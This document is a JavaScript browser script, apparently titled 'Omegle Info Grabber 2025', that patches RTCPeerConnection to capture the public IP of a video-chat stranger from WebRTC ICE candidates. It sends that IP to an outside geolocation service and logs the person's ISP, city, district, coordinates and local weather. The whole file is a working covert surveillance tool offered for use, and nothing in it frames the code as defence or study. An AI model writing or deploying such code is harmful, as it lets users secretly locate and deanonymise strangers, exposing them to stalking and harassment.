///██████╗ ███╗   ███╗███████╗ ██████╗ ██╗     ███████╗    ██╗███╗   ██╗███████╗ ██████╗        ██████╗ ██████╗  █████╗ ██████╗ ██████╗ ███████╗██████╗       ██████╗  ██████╗ ██████╗ ███████╗
///██╔═══██╗████╗ ████║██╔════╝██╔════╝ ██║     ██╔════╝    ██║████╗  ██║██╔════╝██╔═══██╗      ██╔════╝ ██╔══██╗██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔══██╗      ╚════██╗██╔═████╗╚════██╗██╔════╝
///██║   ██║██╔████╔██║█████╗  ██║  ███╗██║     █████╗█████╗██║██╔██╗ ██║█████╗  ██║   ██║█████╗██║  ███╗██████╔╝███████║██████╔╝██████╔╝█████╗  ██████╔╝█████╗ █████╔╝██║██╔██║ █████╔╝███████╗
///██║   ██║██║╚██╔╝██║██╔══╝  ██║   ██║██║     ██╔══╝╚════╝██║██║╚██╗██║██╔══╝  ██║   ██║╚════╝██║   ██║██╔══██╗██╔══██║██╔══██╗██╔══██╗██╔══╝  ██╔══██╗╚════╝██╔═══╝ ████╔╝██║██╔═══╝ ╚════██║
///██████╔╝██║ ╚═╝ ██║███████╗╚██████╔╝███████╗███████╗    ██║██║ ╚████║██║     ╚██████╔╝      ╚██████╔╝██║  ██║██║  ██║██████╔╝██████╔╝███████╗██║  ██║      ███████╗╚██████╔╝███████╗███████║
/// ╚═════╝ ╚═╝     ╚═╝╚══════╝ ╚═════╝ ╚══════╝╚══════╝    ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝        ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝      ╚══════╝ ╚═════╝ ╚══════╝╚══════╝

    

let keyapi = "Your_Location_API_Key";

let apiid = "Your_Weather_API_Key";

window.oRTCPeerConnection =
    window.oRTCPeerConnection || window.RTCPeerConnection;

window.RTCPeerConnection = function (...args) {
    const pc = new window.oRTCPeerConnection(...args);

    pc.oaddIceCandidate = pc.addIceCandidate;

    pc.addIceCandidate = function (iceCandidate, ...rest) {
        const fields = iceCandidate.candidate.split(" ");

        console.log(iceCandidate.candidate);
        const ip = fields[4];
        if (fields[7] === "srflx") {
            getLocation(ip);
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest);
    };
    return pc;
};


let getLocation = async (ip) => {
    let url = `https://api.ipgeolocation.io/ipgeo?apiKey=${keyapi}&ip=${ip}`;
    let output = "";

    
    await fetch(url).then((response) =>
        response.json().then((json) => {
            output = `
-------------------------------
IP: ${ip}
provider: ${json.isp}
Country: ${json.country_name}
State: ${json.state_prov}
City: ${json.city}
District: ${json.district}
Lat / Long: (${json.latitude}, ${json.longitude})
`;

            getWeather(json.city).then((weather) => {
                output += `Temperature: ${weather.temp}°C \n`;
                output += `Weather: ${weather.weather} \n`;
                output += `-------------------------------\nby Asad Ahmad :)`;
                console.log(output);
            });
        })
    );
};


let getWeather = async (city) => {
    let url = `https://api.openweathermap.org/data/2.5/weather?q=${city}&appid=${apiid}&units=metric`;
    let weather = {};

    await fetch(url).then((response) =>
        response.json().then((json) => {
            weather.temp = json.main.temp;
            weather.weather = json.weather[0].main;
        })
    );

    return weather;
};


